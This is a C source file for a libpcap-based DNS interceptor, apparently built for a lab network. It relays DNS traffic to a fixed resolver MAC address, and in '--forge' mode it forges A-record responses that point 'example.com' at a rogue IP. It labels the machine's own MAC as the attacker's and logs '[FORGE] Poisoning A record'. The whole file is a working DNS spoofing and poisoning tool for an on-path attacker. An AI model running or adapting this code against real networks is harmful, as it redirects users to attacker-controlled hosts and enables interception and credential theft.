#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <net/ethernet.h>

#define MAX_PKT_SIZE 2048

static volatile sig_atomic_t keep_running = 1;
static int forge_mode = 0;
static const char *target_qname = "example.com";
static const char *rogue_ip_str = "172.16.1.30";
static uint32_t rogue_ip_n;
static pcap_t *handle = NULL;

static uint8_t resolver_mac[6] = {0x62, 0xdc, 0xc3, 0x52, 0xce, 0x78};
static uint8_t attacker_mac[6];

static void sig_handler(int signum) {
    (void)signum;
    keep_running = 0;
    if (handle) {
        pcap_breakloop(handle);
    }
}

static uint16_t checksum(const void *buf, size_t len) {
    uint32_t sum = 0;
    const uint16_t *p = (const uint16_t *)buf;
    while (len > 1) {
        sum += *p++;
        len -= 2;
    }
    if (len == 1) {
        sum += *(const uint8_t *)p;
    }
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    return (uint16_t)(~sum);
}

struct pseudo_hdr {
    uint32_t src;
    uint32_t dst;
    uint8_t zero;
    uint8_t proto;
    uint16_t udp_len;
} __attribute__((packed));

static uint16_t udp_checksum(struct iphdr *iph, struct udphdr *udph, const uint8_t *payload, size_t payload_len) {
    struct pseudo_hdr ph;
    ph.src = iph->saddr;
    ph.dst = iph->daddr;
    ph.zero = 0;
    ph.proto = IPPROTO_UDP;
    ph.udp_len = htons((uint16_t)(sizeof(struct udphdr) + payload_len));

    size_t total_len = sizeof(ph) + sizeof(struct udphdr) + payload_len;
    uint8_t *buf = (uint8_t *)malloc(total_len);
    if (!buf) return 0;

    memcpy(buf, &ph, sizeof(ph));
    struct udphdr tmp_udp = *udph;
    tmp_udp.check = 0;
    memcpy(buf + sizeof(ph), &tmp_udp, sizeof(tmp_udp));
    memcpy(buf + sizeof(ph) + sizeof(tmp_udp), payload, payload_len);

    uint16_t res = checksum(buf, total_len);
    free(buf);
    return res == 0 ? 0xFFFF : res;
}

static int parse_qname(const uint8_t *dns_payload, size_t dns_len, size_t qname_offset, char *out, size_t out_max) {
    size_t i = qname_offset;
    size_t out_idx = 0;
    while (i < dns_len) {
        uint8_t label_len = dns_payload[i++];
        if (label_len == 0) break;
        if (label_len > 63 || i + label_len > dns_len) return -1;
        if (out_idx != 0 && out_idx + 1 < out_max) out[out_idx++] = '.';
        for (uint8_t l = 0; l < label_len; l++) {
            if (out_idx + 1 < out_max) {
                out[out_idx++] = (char)dns_payload[i++];
            } else {
                return -1;
            }
        }
    }
    if (out_idx < out_max) {
        out[out_idx] = '\0';
        return (int)i;
    }
    return -1;
}

static void packet_handler(u_char *user, const struct pcap_pkthdr *hdr, const u_char *pkt) {
    (void)user;
    if (hdr->caplen < sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + 12) {
        return;
    }

    struct ether_header *eth = (struct ether_header *)pkt;
    if (ntohs(eth->ether_type) != ETHERTYPE_IP) return;

    /* Drop anything transmitted by the attacker */
    if (memcmp(eth->ether_shost, attacker_mac, 6) == 0) return;

    struct iphdr *iph = (struct iphdr *)(pkt + sizeof(struct ether_header));
    if (iph->protocol != IPPROTO_UDP) return;

    size_t ip_hdr_len = iph->ihl * 4;
    struct udphdr *udph = (struct udphdr *)((uint8_t *)iph + ip_hdr_len);

    uint16_t src_port = ntohs(udph->source);
    uint16_t dst_port = ntohs(udph->dest);
    if (src_port != 53 && dst_port != 53) return;

    const uint8_t *dns = (const uint8_t *)udph + sizeof(struct udphdr);
    size_t dns_len = ntohs(udph->len) - sizeof(struct udphdr);
    if (dns_len < 12) return;

    char dst_ip_str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(iph->daddr), dst_ip_str, sizeof(dst_ip_str));

    if (strcmp(dst_ip_str, "172.16.2.10") == 0) {
        uint16_t dns_id = (dns[0] << 8) | dns[1];
        uint16_t flags  = (dns[2] << 8) | dns[3];
        int is_response = (flags & 0x8000) != 0;
        uint16_t qdcount = (dns[4] << 8) | dns[5];

        char qname[256];
        memset(qname, 0, sizeof(qname));
        int qname_end = -1;
        uint16_t qtype = 0;
        if (qdcount > 0) {
            qname_end = parse_qname(dns, dns_len, 12, qname, sizeof(qname));
            if (qname_end >= 0 && (size_t)qname_end + 4 <= dns_len) {
                qtype = (dns[qname_end] << 8) | dns[qname_end + 1];
            }
        }

        /* Target match: EXACT match for "example.com" only */
        if (forge_mode && is_response && strcasecmp(qname, target_qname) == 0 && qtype == 1) {
            printf("[FORGE] Poisoning A record for %s (ID 0x%04x) -> %s\n",
                   qname, dns_id, rogue_ip_str);
            fflush(stdout);

            uint8_t forge_buf[MAX_PKT_SIZE];
            memset(forge_buf, 0, sizeof(forge_buf));

            struct ether_header *out_eth = (struct ether_header *)forge_buf;
            memcpy(out_eth->ether_shost, attacker_mac, 6);
            memcpy(out_eth->ether_dhost, resolver_mac, 6);
            out_eth->ether_type = htons(ETHERTYPE_IP);

            uint8_t out_dns[512];
            memset(out_dns, 0, sizeof(out_dns));
            out_dns[0] = (uint8_t)(dns_id >> 8);
            out_dns[1] = (uint8_t)(dns_id & 0xFF);
            out_dns[2] = 0x81;
            out_dns[3] = 0x80;
            out_dns[4] = 0x00; out_dns[5] = 0x01;
            out_dns[6] = 0x00; out_dns[7] = 0x01;
            out_dns[8] = 0x00; out_dns[9] = 0x00;
            out_dns[10] = 0x00; out_dns[11] = 0x00;

            size_t q_sec_len = (size_t)qname_end + 4 - 12;
            memcpy(out_dns + 12, dns + 12, q_sec_len);
            size_t curr_dns_len = 12 + q_sec_len;

            out_dns[curr_dns_len++] = 0xC0;
            out_dns[curr_dns_len++] = 0x0C;
            out_dns[curr_dns_len++] = 0x00; out_dns[curr_dns_len++] = 0x01;
            out_dns[curr_dns_len++] = 0x00; out_dns[curr_dns_len++] = 0x01;
            out_dns[curr_dns_len++] = 0x00; out_dns[curr_dns_len++] = 0x00;
            out_dns[curr_dns_len++] = 0x01; out_dns[curr_dns_len++] = 0x2C;
            out_dns[curr_dns_len++] = 0x00; out_dns[curr_dns_len++] = 0x04;
            memcpy(out_dns + curr_dns_len, &rogue_ip_n, 4);
            curr_dns_len += 4;

            struct iphdr *out_iph = (struct iphdr *)(forge_buf + sizeof(struct ether_header));
            out_iph->ihl = 5;
            out_iph->version = 4;
            out_iph->tos = 0;
            out_iph->tot_len = htons((uint16_t)(sizeof(struct iphdr) + sizeof(struct udphdr) + curr_dns_len));
            out_iph->id = htons(1337);
            out_iph->frag_off = 0;
            out_iph->ttl = 64;
            out_iph->protocol = IPPROTO_UDP;
            out_iph->saddr = iph->saddr;
            out_iph->daddr = iph->daddr;
            out_iph->check = 0;
            out_iph->check = checksum(out_iph, sizeof(struct iphdr));

            struct udphdr *out_udph = (struct udphdr *)(forge_buf + sizeof(struct ether_header) + sizeof(struct iphdr));
            out_udph->source = udph->source;
            out_udph->dest = udph->dest;
            out_udph->len = htons((uint16_t)(sizeof(struct udphdr) + curr_dns_len));
            out_udph->check = udp_checksum(out_iph, out_udph, out_dns, curr_dns_len);

            memcpy(forge_buf + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr),
                   out_dns, curr_dns_len);

            size_t total_forge_len = sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + curr_dns_len;
            pcap_sendpacket(handle, forge_buf, total_forge_len);
            return;
        }

        /* Non-target name or relay mode: Recalculate IP & UDP checksum and relay cleanly */
        printf("[RELAY] Relaying message for %s (ID 0x%04x)\n", qname[0] ? qname : "<non-query>", dns_id);
        fflush(stdout);

        uint8_t relay_buf[MAX_PKT_SIZE];
        memcpy(relay_buf, pkt, hdr->caplen);

        struct ether_header *rel_eth = (struct ether_header *)relay_buf;
        memcpy(rel_eth->ether_shost, attacker_mac, 6);
        memcpy(rel_eth->ether_dhost, resolver_mac, 6);

        struct iphdr *rel_iph = (struct iphdr *)(relay_buf + sizeof(struct ether_header));
        struct udphdr *rel_udph = (struct udphdr *)((uint8_t *)rel_iph + ip_hdr_len);
        const uint8_t *rel_dns = (const uint8_t *)rel_udph + sizeof(struct udphdr);
        size_t rel_dns_len = ntohs(rel_udph->len) - sizeof(struct udphdr);

        rel_iph->check = 0;
        rel_iph->check = checksum(rel_iph, ip_hdr_len);

        rel_udph->check = udp_checksum(rel_iph, rel_udph, rel_dns, rel_dns_len);

        pcap_sendpacket(handle, relay_buf, hdr->caplen);
        return;
    }
}

int main(int argc, char **argv) {
    if (argc > 1 && strcmp(argv[1], "--forge") == 0) {
        forge_mode = 1;
    } else {
        forge_mode = 0;
    }

    inet_pton(AF_INET, rogue_ip_str, &rogue_ip_n);

    FILE *f = fopen("/sys/class/net/eth0/address", "r");
    if (f) {
        int m[6];
        if (fscanf(f, "%x:%x:%x:%x:%x:%x", &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) == 6) {
            for (int i = 0; i < 6; i++) attacker_mac[i] = (uint8_t)m[i];
        }
        fclose(f);
    }

    printf("Starting DNS Interceptor [%s mode] on eth0...\n", forge_mode ? "FORGE" : "RELAY");
    printf("Attacker MAC: %02x:%02x:%02x:%02x:%02x:%02x | Target Resolver MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
           attacker_mac[0], attacker_mac[1], attacker_mac[2], attacker_mac[3], attacker_mac[4], attacker_mac[5],
           resolver_mac[0], resolver_mac[1], resolver_mac[2], resolver_mac[3], resolver_mac[4], resolver_mac[5]);
    fflush(stdout);

    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live("eth0", MAX_PKT_SIZE, 1, 1, errbuf);
    if (!handle) {
        fprintf(stderr, "pcap_open_live failed: %s\n", errbuf);
        return 1;
    }

    struct bpf_program fp;
    if (pcap_compile(handle, &fp, "udp and port 53", 1, PCAP_NETMASK_UNKNOWN) == -1) {
        fprintf(stderr, "pcap_compile failed: %s\n", pcap_geterr(handle));
        return 1;
    }
    pcap_setfilter(handle, &fp);

    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    pcap_loop(handle, -1, packet_handler, NULL);

    pcap_freecode(&fp);
    pcap_close(handle);
    return 0;
}
